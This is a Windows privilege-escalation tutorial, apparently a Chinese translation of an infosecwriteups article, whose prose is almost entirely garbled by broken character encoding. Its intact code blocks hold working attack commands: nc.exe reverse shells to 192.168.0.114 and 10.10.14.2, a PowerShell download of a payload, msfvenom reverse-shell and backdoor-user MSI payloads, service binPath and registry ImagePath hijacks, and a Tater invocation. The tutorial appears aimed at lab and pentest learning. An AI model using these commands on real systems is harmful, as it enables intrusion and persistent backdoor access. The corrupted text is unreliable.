# Windows ä¸­çš„æƒé™æå‡

> åŸæ–‡ï¼š<https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842?source=collection_archive---------0----------------------->

## æ¡æ¡å¤§è·¯é€šç³»ç»Ÿ

![](img/c29da714a61c8e6e3179ff21fc0c32bf.png)

æƒé™æå‡ä¸€å¼€å§‹å¯èƒ½ä¼šä»¤äººæœ›è€Œç”Ÿç•ï¼Œä½†æ˜¯ä¸€æ—¦æ‚¨çŸ¥é“è¦å¯»æ‰¾ä»€ä¹ˆå’Œè¦å¿½ç•¥ä»€ä¹ˆï¼Œå®ƒå°±ä¼šå˜å¾—å®¹æ˜“ã€‚æƒé™æå‡æ€»æ˜¯å½’ç»“äºæ­£ç¡®çš„æšä¸¾ã€‚æœ¬æŒ‡å—å°†ä¸»è¦å…³æ³¨å¸¸è§çš„æƒé™æå‡æŠ€æœ¯å¹¶åˆ©ç”¨å®ƒä»¬ã€‚

æœ¬æ•™ç¨‹çš„èµ·ç‚¹æ˜¯ä¸€ä¸ªç›’å­ä¸Šçš„éç‰¹æƒå¤–å£³ã€‚å‡ºäºæ¼”ç¤ºçš„ç›®çš„ï¼Œæˆ‘ä½¿ç”¨`netcat`ä» Windows 7 x86 è™šæ‹Ÿæœºè·å¾—äº†ä¸€ä¸ªåå‘ shellã€‚

# åˆ—ä¸¾

æˆ‘å†æ€ä¹ˆå¼ºè°ƒæšä¸¾çš„é‡è¦æ€§ä¹Ÿä¸ä¸ºè¿‡ã€‚æœ‰å¾ˆå¤šå°æŠ„å¯ä»¥ä»ç³»ç»Ÿä¸­æå–æœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚åœ¨æœ¬æŒ‡å—ä¸­ï¼Œæˆ‘å°†é‡ç‚¹ä»‹ç»å¯ç”¨çš„è„šæœ¬ä»¥åŠå¦‚ä½•ä½¿ç”¨å®ƒä»¬ã€‚ä¸€äº›æµè¡Œçš„å¯ç”¨è„šæœ¬æœ‰:

1.  å¡æ´›æ–¯Â·æ³¢æ´›æ™®åˆ›ä½œçš„ã€Šæ¸©è±†è±†ã€‹
2.  [é€šè¿‡ harmj0y ä¸Šç”µ](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
3.  [æ²ƒæ£®](https://github.com/rasta-mouse/Watson)ç”±æ‹‰æ–¯å¡”é¼ 
4.  [å®‰å…¨å¸¦](https://github.com/GhostPack/Seatbelt)
5.  [æ— èƒ½ä¸ºåŠ›](https://github.com/M4ximuss/Powerless)
6.  [é’³å£](https://github.com/411Hall/JAWS)

ä»¥æˆ‘çš„ç»éªŒæ¥çœ‹ï¼ŒwinPEAS å’Œ PowerUp æ˜¯æœ€æœ‰ç”¨çš„å·¥å…·ã€‚PowerUp æ˜¯ç”¨ PowerShell å†™çš„ï¼ŒwinPEAS æ˜¯ç”¨ C#å†™çš„ã€‚ä½ éœ€è¦ã€‚NET Framework 4.0 æ¥è¿è¡Œ winPEASã€‚è¿˜æœ‰ä¸€ä¸ª. bat ç‰ˆæœ¬çš„ winPEASï¼Œå¦‚æœã€‚ä¸å­˜åœ¨ç½‘ç»œæ”¯æŒã€‚å°±æˆ‘è€Œè¨€ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼ŒWindows 7 ä¸Šæ²¡æœ‰å®‰è£… NET 4.0ï¼Œæ‰€ä»¥æˆ‘å¿…é¡»å®‰è£…å®ƒæ‰èƒ½ä½¿ç”¨ winPEASã€‚ä¸ºäº†å®‰å…¨èµ·è§ï¼Œæ€»æ˜¯ä¸ºæšä¸¾è¿è¡Œå¤šä¸ªè„šæœ¬ã€‚ä¾‹å¦‚ï¼ŒwinPEAS æ£€æµ‹åˆ°äº†å¼±æ³¨å†Œè¡¨æ¼æ´ï¼Œä½† PowerUp æ²¡æœ‰æ£€æµ‹åˆ°ã€‚

# ç‰¹æƒæå‡æŠ€æœ¯

## å­˜å‚¨çš„å‡­æ®

åœ¨æ³¨å†Œè¡¨ä¸­æœç´¢ç”¨æˆ·åå’Œå¯†ç ã€‚

![](img/1c07556f8db03cefd15480d4adb7f2ff.png)

æ—¢ç„¶ä½ å·²ç»æ‰¾åˆ°äº†å¯†ç ï¼Œä½ ä¼šç”¨å®ƒåšä»€ä¹ˆå‘¢ï¼Ÿå¦‚æœ RDP æ˜¯å¯è®¿é—®çš„ï¼Œå¹¶ä¸”ç”¨æˆ·åœ¨`Remote Desktop Users`ç»„ä¸­ï¼Œé‚£å°±å¤ªå¥½äº†ã€‚å¦åˆ™ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„ PowerShell è„šæœ¬ä»¥è¯¥ç”¨æˆ·çš„èº«ä»½è¿è¡Œå‘½ä»¤ã€‚

```
$secpasswd = ConvertTo-SecureString "password321" -AsPlainText -Force
$mycreds = New-Object System.Management.Automation.PSCredential ("john", $secpasswd)
$computer = "GHOST"
[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","192.168.0.114 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)
```

å¦‚æœ`cmdkey /list`è¿”å›æ¡ç›®ï¼Œè¿™æ„å‘³ç€ä½ å¯ä»¥ä»¥æŸä¸ªç”¨æˆ·çš„èº«ä»½è¿è¡Œï¼Œè¿™ä¸ªç”¨æˆ·åœ¨ windows ä¸­å­˜å‚¨äº†ä»–çš„å‡­è¯ã€‚

```
runas /savecred /user:ACCESS\Administrator "c:\windows\system32\cmd.exe /c \IP\share\nc.exe -nv 10.10.14.2 80 -e cmd.exe"
```

## Windows å†…æ ¸å¼€å‘

å¦‚æœæ“ä½œç³»ç»Ÿå®šæœŸæ›´æ–°ï¼Œé‚£ä¹ˆè¿™äº›æ¼æ´ä¸ä¼šæœ‰å¤ªå¤§çš„å¸®åŠ©ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ Watson æ¥æ£€æŸ¥ç”±äºç¼ºå°‘è¡¥ä¸è€Œå¯¼è‡´çš„æ¼æ´ã€‚æ²ƒæ£®å·²ç»å’Œ winPEAS æ•´åˆäº†ã€‚å¦‚æœä½ å‘ç°ä»»ä½•æ¼æ´ï¼Œä½ å¯ä»¥ä»ä¸‹é¢çš„åº“ä¸‹è½½ã€‚ç¡®ä¿ä¸ºæ‚¨çš„ç›®æ ‡ä¸‹è½½æ­£ç¡®çš„æ¶æ„ã€‚å¦‚æœä½ éœ€è¦ç¼–è¯‘äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½ å¯ä»¥ä½¿ç”¨ Kali è¿›è¡Œäº¤å‰ç¼–è¯‘ã€‚

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

## DLL åŠ«æŒ

windows ç¨‹åºåœ¨å¯åŠ¨æ—¶ä¼šå¯»æ‰¾ dllã€‚å¦‚æœè¿™äº› DLL ä¸å­˜åœ¨ï¼Œåˆ™æœ‰å¯èƒ½é€šè¿‡åœ¨åº”ç”¨ç¨‹åºå¯»æ‰¾çš„ä½ç½®æ”¾ç½®æ¶æ„ DLL æ¥æå‡æƒé™ã€‚

é€šå¸¸ï¼ŒWindows åº”ç”¨ç¨‹åºä¼šä½¿ç”¨é¢„å®šä¹‰çš„æœç´¢è·¯å¾„æ¥æŸ¥æ‰¾ DLLï¼Œå¹¶ä¸”ä¼šä»¥ç‰¹å®šçš„é¡ºåºæ£€æŸ¥è¿™äº›è·¯å¾„ã€‚

1.åº”ç”¨ç¨‹åºåŠ è½½çš„ç›®å½•
2ã€‚32 ä½ç³»ç»Ÿç›®å½•(C:\Windows\System32)
3ã€‚16 ä½ç³»ç»Ÿç›®å½•(C:\Windows\System)
4ã€‚Windows ç›®å½•(C:\Windows)
5ã€‚å½“å‰å·¥ä½œç›®å½•(CWD)
6ã€‚PATH ç¯å¢ƒå˜é‡ä¸­çš„ç›®å½•(é¦–å…ˆæ˜¯ç³»ç»Ÿï¼Œç„¶åæ˜¯ç”¨æˆ·)

![](img/2f3380ec7acddfc00fda341d5c45ab09.png)

å¦‚æ‚¨æ‰€è§ï¼ŒPowerUp æ£€æµ‹åˆ°äº†ä¸€ä¸ªæ½œåœ¨çš„ DLL åŠ«æŒæ¼æ´ã€‚é€šå¸¸æˆ‘ä»¬æ˜¯åˆ©ç”¨ PowerUp çš„`Write-HijackDll`å‡½æ•°ç¼–å†™æ¶æ„ DLLï¼Œé‡å¯ç¨‹åºã€‚å½“ç¨‹åºå¯åŠ¨æ—¶ï¼Œå®ƒåŠ è½½æ¶æ„çš„ DLL å¹¶ä»¥æ›´é«˜çš„æƒé™æ‰§è¡Œæˆ‘ä»¬çš„ä»£ç ã€‚

```
Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'
```

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¿«é€Ÿçš„è°·æ­Œæœç´¢æ­ç¤ºäº†å¯ç”¨äºåˆ©ç”¨è¯¥æ¼æ´çš„[https://github.com/itm4n/Ikeext-Privesc](https://github.com/itm4n/Ikeext-Privesc)ã€‚

ä½†æ˜¯ï¼Œæ‚¨å¯ä»¥æ‰‹åŠ¨æ‰§è¡Œæ­¤æ“ä½œï¼Œä»¥äº†è§£æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹ã€‚å¯ä»¥å‚è€ƒæˆ‘çš„å¸–å­[è¿™é‡Œ](https://medium.com/@sghosh2402/ikeext-dll-hijacking-3aefe4dde7f5)ã€‚

## æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„

å½“æœåŠ¡å¯åŠ¨æ—¶ï¼ŒWindows å°†æœç´¢è¦æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚è¦æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„ä½ç½®åœ¨`binPath`å±æ€§ä¸­å£°æ˜ã€‚å¦‚æœäºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„æ²¡æœ‰åŠ å¼•å·ï¼Œåˆ™ Windows ä¸çŸ¥é“äºŒè¿›åˆ¶æ–‡ä»¶çš„ä½ç½®ï¼Œå¹¶å°†åœ¨æ‰€æœ‰æ–‡ä»¶å¤¹ä¸­æœç´¢ï¼Œä»è·¯å¾„çš„å¼€å¤´å¼€å§‹ã€‚

å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬æƒ³åˆ©ç”¨è¿™ç§é”™è¯¯é…ç½®ï¼Œå¿…é¡»æ»¡è¶³ä¸‰ä¸ªæ¡ä»¶:

*   æœåŠ¡è·¯å¾„æœªåŠ å¼•å·ï¼›
*   æœåŠ¡è·¯å¾„åŒ…å«ç©ºæ ¼ï¼›å’Œ
*   æˆ‘ä»¬åœ¨å…¶ä¸­ä¸€ä¸ªä¸­é—´æ–‡ä»¶å¤¹ä¸­æ‹¥æœ‰å†™æƒé™ã€‚

å¦‚æœ`binPath`è®¾ç½®ä¸º

```
C:\Program Files\Unquoted Path Service\Common Files\service.exe
```

Windows å°†æŒ‰æ­¤é¡ºåºæœç´¢:

1.  C:\Program.exe
2.  C:\Program Files\Unquoted.exe
3.  c:\ Program Files \æœªå¼•ç”¨çš„ Path.exe
4.  c:\ Program Files \æœªåŠ å¼•å·çš„è·¯å¾„æœåŠ¡\Common.exe
5.  c:\ Program Files \ un quoted Path Service \ Common Files \ Service . exe

![](img/5aa9c581c58aa4d8565b50cb740c96ef.png)

é€šç”µæ£€æµ‹åˆ°æœªå¼•ç”¨çš„æœåŠ¡è·¯å¾„

![](img/7ace1156a97dddd6fdf95bb03806aeec.png)

winPEAS æ£€æµ‹åˆ°å¯å†™è·¯å¾„

ç”¨`msfvenom`åˆ›å»ºä¸€ä¸ªæœ‰æ•ˆè½½è·ï¼Œå¹¶å°†å…¶å‘½åä¸º control.exeã€‚å°†å…¶æ”¾åœ¨`C:\Program Files\Unquoted Path Service\common.exe`ç›®å½•ä¸­ã€‚

```
powershell -nop -exec bypass -c "(New-Object Net.WebClient).DownloadFile('[http://192.168.0.114:8080/common.exe'](http://192.168.0.114:8080/common.exe'), 'C:\Program Files\Unquoted Path Service\common.exe')"
```

![](img/0f30ed312642592db381c62a9793bdcc.png)

é€šè¿‡ä½¿ç”¨`sc start unquotedsvc`å¯åŠ¨æœåŠ¡æ¥æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½

## å¼±æ–‡ä»¶å¤¹æƒé™

å¦‚æœç”¨æˆ·å¯¹æœåŠ¡ä½¿ç”¨çš„æ–‡ä»¶å¤¹æœ‰å†™æƒé™ï¼Œä»–å¯ä»¥ç”¨æ¶æ„çš„äºŒè¿›åˆ¶æ–‡ä»¶æ›¿æ¢å®ƒã€‚å½“æœåŠ¡é‡æ–°å¯åŠ¨æ—¶ï¼Œæ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶å°†ä»¥æ›´é«˜çš„æƒé™æ‰§è¡Œã€‚

![](img/0384ff8e30915275d2878b90b63d4a65.png)

å…·æœ‰å¼±æƒé™çš„æœåŠ¡äºŒè¿›åˆ¶æ–‡ä»¶

![](img/da8d290f9682a410024840808182aa03.png)

é€šè¿‡å°†æœ‰æ•ˆè´Ÿè½½å¤åˆ¶åˆ°æœåŠ¡äºŒè¿›åˆ¶ä½ç½®æ¥æ›¿æ¢æ–‡ä»¶ã€‚é‡æ–°å¯åŠ¨æœåŠ¡ï¼Œä»¥æ›´é«˜çš„æƒé™æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½ã€‚

```
copy /y C:\Users\user\Desktop\shell.exe "c:\Program Files\File Permissions Service\filepermservice.exe"sc start filepermsvc
```

## å¼±æœåŠ¡æƒé™

ç”±å…·æœ‰å¼±æƒé™çš„ç³»ç»Ÿåˆ›å»ºçš„æœåŠ¡å¯èƒ½ä¼šå¯¼è‡´æƒé™æå‡ã€‚å¦‚æœä½æƒé™ç”¨æˆ·å¯ä»¥ä¿®æ”¹æœåŠ¡é…ç½®ï¼Œä¾‹å¦‚å°†`binPath`æ›´æ”¹ä¸ºæ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶å¹¶é‡æ–°å¯åŠ¨æœåŠ¡ï¼Œé‚£ä¹ˆæ¶æ„äºŒè¿›åˆ¶æ–‡ä»¶å°†ä»¥ç³»ç»Ÿæƒé™æ‰§è¡Œã€‚

å¦‚æœâ€œè®¤è¯ç”¨æˆ·â€ç»„åœ¨æœåŠ¡ä¸­æœ‰ **SERVICE_ALL_ACCESS** ï¼Œé‚£ä¹ˆå®ƒå¯ä»¥ä¿®æ”¹æœåŠ¡æ­£åœ¨æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚

![](img/a8b57e0f1f403bfd590f94760826d684.png)

```
msfvenom -p windows/shell_reverse_tcp LPORT=31337 LHOST=YOURIPHERE -f exe-service > shell.exe
```

å½“ Windows è°ƒç”¨å¯åŠ¨æœåŠ¡æ—¶ï¼Œå®ƒè°ƒç”¨ ServiceMain å‡½æ•°å¹¶æœŸæœ›ä»è¯¥è°ƒç”¨ä¸­è¿”å›ã€‚å¦‚æœä½ ä¸æŒ‡å®š exe-serviceï¼Œç”Ÿæˆçš„æœ‰æ•ˆè´Ÿè½½å°†ä¸èƒ½ç»™ä½ ä¸€ä¸ªæŒä¹…çš„å¤–å£³ã€‚

ä½¿ç”¨ä¿®æ”¹é…ç½®ï¼Œå¹¶å¯åŠ¨æœåŠ¡ä»¥æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½ã€‚

`sc config daclsvc binpath= "C:\Users\user\Desktop\shell.exe"`

![](img/6ab1bf50f74dbe805dd1ca957e1b0eb4.png)

## å¼±æ³¨å†Œè¡¨æƒé™

åœ¨ Windows ä¸­ï¼ŒæœåŠ¡æœ‰ä¸€ä¸ªæ³¨å†Œè¡¨é¡¹ï¼Œè¿™äº›æ³¨å†Œè¡¨é¡¹ä½äº:`HKLM\SYSTEM\CurrentControlSet\Services\<service_name>`

å¦‚æœ**è®¤è¯ç”¨æˆ·**æˆ–**NT AUTHORITY \ INTERACTIVE**æ‹¥æœ‰ä»»ä½•æœåŠ¡çš„å®Œå…¨æ§åˆ¶æƒï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥æ›´æ”¹æœåŠ¡å°†è¦æ‰§è¡Œçš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚

![](img/c12d3b901006732068c5a341a25e2866.png)![](img/b741abf3f960bd679a661af9a7afa5cb.png)

å°†æ³¨å†Œè¡¨çš„`ImagePath`é”®ä¿®æ”¹ä¸ºæ‚¨çš„æœ‰æ•ˆè´Ÿè½½è·¯å¾„ï¼Œå¹¶é‡æ–°å¯åŠ¨æœåŠ¡ã€‚

```
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\Temp\shell.exe /fsc start regsvc
```

## å§‹ç»ˆå®‰è£…é«˜æ¶

Windows å¯ä»¥é€šè¿‡ AlwaysInstallElevated ç»„ç­–ç•¥å…è®¸ä½æƒé™ç”¨æˆ·ä½¿ç”¨ç³»ç»Ÿæƒé™å®‰è£… Microsoft Windows Installer åŒ…(MSI)ã€‚

![](img/0d5cf7c5b3f1d66ca2530858f340608c.png)

ä»¥`msi`æ ¼å¼ç”Ÿæˆ`msfvenom` æœ‰æ•ˆè½½è·ã€‚

![](img/6be38237edf7ff6a5d06079e93c88c65.png)

`msfvenom -p windows/adduser USER=backdoor PASS=Pass@1234 -f msi -o setup.msi`

ä½¿ç”¨ä»¥ä¸‹å·¥å…·å®‰è£…æœ‰æ•ˆè´Ÿè½½

```
msiexec /quiet /qn /i C:\Windows\Temp\setup.msi
```

![](img/f4d7aacfe3d94fe589a645199a26e330.png)

å®‰è£… MSI åæ·»åŠ çš„åé—¨ç”¨æˆ·

## å¯ä¿®æ”¹çš„è‡ªåŠ¨è¿è¡Œ

![](img/023d0b880d63ab201021258e2df57692.png)

å› ä¸ºå¯ä»¥ä¿®æ”¹è‡ªåŠ¨è¿è¡Œçš„è·¯å¾„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç”¨æˆ‘ä»¬çš„æœ‰æ•ˆè´Ÿè½½æ›¿æ¢è¿™ä¸ªæ–‡ä»¶ã€‚è¦ä»¥æå‡çš„æƒé™æ‰§è¡Œå®ƒï¼Œæˆ‘ä»¬éœ€è¦ç­‰å¾…ç®¡ç†ç»„ä¸­çš„æŸä¸ªäººç™»å½•ã€‚

![](img/26dbb1ad7f2794ec1822b9d95e7fbc94.png)![](img/2ff849668fd4f16f40de12972e26c141.png)

ç®¡ç†å‘˜ç™»å½•

![](img/f202359333ff7335b3118f660be4ad21.png)

ç®¡ç†å‘˜ç™»å½•åç«‹å³æ‰§è¡Œæœ‰æ•ˆè´Ÿè½½ã€‚

## é©¬é“ƒè–¯/çƒ«æ‰‹å±±èŠ‹ğŸ”¥

çƒ«æ‰‹å±±èŠ‹(åˆå:åœŸè±†)åˆ©ç”¨ Windows ä¸­çš„å·²çŸ¥é—®é¢˜æ¥è·å–é»˜è®¤é…ç½®ä¸­çš„æœ¬åœ°æƒé™æå‡ï¼Œå³ NTLM ä¸­ç»§(ç‰¹åˆ«æ˜¯ HTTP->SMB ä¸­ç»§)å’Œ NBNS æ¬ºéª—

ä½ å¯ä»¥åœ¨è¿™é‡Œé˜…è¯»æ›´å¤šå…³äºè¿™ä¸ªæ¼æ´çš„ä¿¡æ¯ã€‚

æˆ‘ä»¬å¢åŠ äº†å¾ˆå¤šç”¨æˆ·ã€‚è®©æˆ‘ä»¬ç”¨ç®¡ç†å‘˜æƒé™åˆ é™¤å…¶ä¸­ä¸€ä¸ªã€‚

![](img/4f9b0bac3cd8fa36b5b7c7fa75639434.png)

ç®¡ç†ç»„å†…éƒ¨çš„åé—¨ç”¨æˆ·

```
powershell -exec Bypass -c ". .\Tater.ps1;Invoke-Tater -Trigger 1 -Command 'net localgroup administrators backdoor /delete';"
```

![](img/2e08b991e1d8bd3b2bf33af46b899f9e.png)

æ¼æ´åˆ©ç”¨å®Œæˆåï¼Œåé—¨ç”¨æˆ·è¢«åˆ é™¤ã€‚

## ä»¤ç‰Œæ“ä½œ

åœ¨æ¸—é€æµ‹è¯•é¡¹ç›®ä¸­ï¼Œæ¸—é€æµ‹è¯•äººå‘˜ç»å¸¸è®¾æ³•å±åŠ Apacheã€IISã€SQLã€MySQL ç­‰æœåŠ¡çš„å®‰å…¨ã€‚é—æ†¾çš„æ˜¯ï¼Œæ­¤æœåŠ¡ä¸æ˜¯ä½œä¸ºæœ¬åœ°ç³»ç»Ÿæˆ–é«˜ç‰¹æƒå¸æˆ·è¿è¡Œï¼Œè€Œæ˜¯ä½œä¸ºç½‘ç»œæœåŠ¡è¿è¡Œã€‚æ‚¨å¯ä»¥åˆ©ç”¨ä»¥ä¸‹æ¼æ´æå‡æƒé™ã€‚

1.  [çƒ‚åœŸè±†](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
2.  [å¤šæ±çš„åœŸè±†](https://github.com/ohpe/juicy-potato/releases)

## æ‡’äººèµ‹ğŸ˜œ

```
meterpreter> getsystem
```

*å…³æ³¨* [*Infosec æŠ¥é“*](https://medium.com/bugbountywriteup) *è·å–æ›´å¤šæ­¤ç±»ç²¾å½©æŠ¥é“ã€‚*

[](https://medium.com/bugbountywriteup) [## ä¿¡æ¯å®‰å…¨æŠ¥é“

### æ”¶é›†äº†ä¸–ç•Œä¸Šæœ€å¥½çš„é»‘å®¢çš„æ–‡ç« ï¼Œä¸»é¢˜ä» bug å¥–é‡‘å’Œ CTF åˆ° vulnhubâ€¦

medium.com](https://medium.com/bugbountywriteup)